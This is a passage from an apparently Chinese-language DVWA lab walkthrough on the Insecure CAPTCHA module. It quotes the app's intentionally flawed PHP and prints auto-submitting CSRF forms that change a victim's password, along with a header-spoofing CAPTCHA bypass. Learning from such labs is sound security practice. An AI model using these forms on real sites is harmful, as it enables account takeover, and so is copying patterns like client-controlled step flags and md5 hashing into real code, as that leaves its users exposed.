class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) &#123;</span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check to see if both password match</span></span><br><span class="line">	<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update database</span></span><br><span class="line">		$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">		$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with the passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>源代码只是简单地通过<code>setp</code>参数来决定执行哪些步骤：①<code>setp=1</code>时接受用户提交的新密码、新密码确认、验证码，然后对验证码进行验证，验证通过后，如果新密码等于新密码确认，重新构造并提交表单（包含新密码、新密码确认和setp=2）；②<code>setp=2</code>时，直接将密码进行md5加密后修改当前登录用户的密码。很容易看出来这个逻辑漏洞，这个setp参数是通过POST方式提交的并且可控的话，我们可以直接绕过验证码的验证部分，进入修改密码部分</p>
-<p>现在修改密码并抓包看一下请求包的内容</p>
-<p>Ps:因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有<code>recaptcha_challenge_field</code>、<code>recaptcha_response_field</code>两个参数</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/6-3.png" alt="6-3"></p>
-<p>将<code>setp=1</code>改为<code>setp=2</code>，然后发送请求后，可以看到提示<code>Password Changed</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/6-4.png" alt="6-4"></p>
-<p>由于没有防CSRF的机制，所以现在构造攻击页面去攻击，HTML代码如下</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>      </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"document.getElementById('transfer').submit()"</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>    </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://192.168.0.105/dvwa/vulnerabilities/captcha/"</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"888"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"888"</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"step"</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span>   </span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当受害者访问这个页面之后，代码就会自动向服务器提交表单利用刚才分析的漏洞去修改密码。但是有一点不好就是服务器会302重定向，返回修改密码成功的页面，受害者就会马上意识到</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/6-5.png" alt="6-5"></p>
-<h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'1'</span> ) ) &#123;</span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">	$resp = recaptcha_check_answer(</span><br><span class="line">		$_DVWA[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">		$_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">	<span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">		<span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">		$html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">		<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">			<span class="comment">// Show next stage for the user</span></span><br><span class="line">			$html .= <span class="string">"</span></span><br><span class="line"><span class="string">				&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">				&lt;form action=\"#\" method=\"POST\"&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"password_new\" value=\"&#123;$pass_new&#125;\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"password_conf\" value=\"&#123;$pass_conf&#125;\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"hidden\" name=\"passed_captcha\" value=\"true\" /&gt;</span></span><br><span class="line"><span class="string">					&lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;</span></span><br><span class="line"><span class="string">				&lt;/form&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Both new passwords do not match.</span></span><br><span class="line">			$html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">			$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) &amp;&amp; ( $_POST[ <span class="string">'step'</span> ] == <span class="string">'2'</span> ) ) &#123;</span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check to see if they did stage 1</span></span><br><span class="line">	<span class="keyword">if</span>( !$_POST[ <span class="string">'passed_captcha'</span> ] ) &#123;</span><br><span class="line">		$html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check to see if both password match</span></span><br><span class="line">	<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update database</span></span><br><span class="line">		$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">		$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with the passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>本难度只是在<code>setp=1</code>提交的表单中多添加了<code>passed_captcha</code>参数，当<code>setp=2</code>没有检测到这个参数时就会报错。那解决办法也很简单，只需要在我们做的攻击表单中多添加这个参数，值为true就可以了</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>      </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"document.getElementById('transfer').submit()"</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span>&gt;</span>    </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://192.168.0.105/dvwa/vulnerabilities/captcha/"</span>&gt;</span>     </span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"777"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"777"</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">             <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"passed_captcha"</span> <span class="attr">value</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"step"</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span>   </span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span>        </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>修改完代码，重新访问，密码再次成功更改</p>
-<h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">	$resp = recaptcha_check_answer(</span><br><span class="line">		$_DVWA[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">		$_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (</span><br><span class="line">		$resp || </span><br><span class="line">		(</span><br><span class="line">			$_POST[ <span class="string">'g-recaptcha-response'</span> ] == <span class="string">'hidd3n_valu3'</span></span><br><span class="line">			&amp;&amp; $_SERVER[ <span class="string">'HTTP_USER_AGENT'</span> ] == <span class="string">'reCAPTCHA'</span></span><br><span class="line">		)</span><br><span class="line">	)&#123;</span><br><span class="line">		<span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">		<span class="keyword">if</span> ($pass_new == $pass_conf) &#123;</span><br><span class="line">			$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">			$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Update database</span></span><br><span class="line">			$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"' LIMIT 1;"</span>;</span><br><span class="line">			$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Feedback for user</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Ops. Password mismatch</span></span><br><span class="line">			$html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>;</span><br><span class="line">			$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">		$html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>本难度取消了<code>step</code>参数的判断，而多了以下的判断</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$resp || ($_POST[ <span class="string">'g-recaptcha-response'</span> ] == <span class="string">'hidd3n_valu3'</span>&amp;&amp; $_SERVER[ <span class="string">'HTTP_USER_AGENT'</span> ] == <span class="string">'reCAPTCHA'</span>)</span><br></pre></td></tr></table></figure>
-<p>只有符合以上条件才能进入修改密码的代码，<code>$resp</code>我们已经确定无法控制，所以现在就从<code>$_POST[ &#39;g-recaptcha-response&#39; ]</code>和<code>$_SERVER[ &#39;HTTP_USER_AGENT&#39; ]</code>入手了。修改一下这两个参数也很简单，抓包修改就可以，如下图</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/6-6.png" alt="6-6"></p>
-<p>重新登录验证一下，密码果然修改成功</p>
-<h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">	$hide_form = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_POST[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_new  = stripslashes( $pass_new );</span><br><span class="line">	$pass_new  = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$pass_new  = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">	$pass_conf = $_POST[ <span class="string">'password_conf'</span> ];</span><br><span class="line">	$pass_conf = stripslashes( $pass_conf );</span><br><span class="line">	$pass_conf = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_conf ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$pass_conf = md5( $pass_conf );</span><br><span class="line"></span><br><span class="line">	$pass_curr = $_POST[ <span class="string">'password_current'</span> ];</span><br><span class="line">	$pass_curr = stripslashes( $pass_curr );</span><br><span class="line">	$pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_curr ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check 